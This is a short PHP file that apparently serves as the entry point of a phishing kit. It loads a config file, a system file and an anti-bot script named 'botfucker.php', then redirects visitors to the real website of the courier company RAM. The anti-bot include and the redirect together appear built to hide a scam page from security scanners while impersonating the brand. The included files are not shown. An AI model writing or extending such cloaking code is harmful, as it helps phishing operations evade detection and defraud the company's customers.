<?php
include("./owner/config.php");
include "./files/php/sys.php";
include './files/php/911/botfucker.php'; 

header("Location: https://www.ram.co.za/")
?>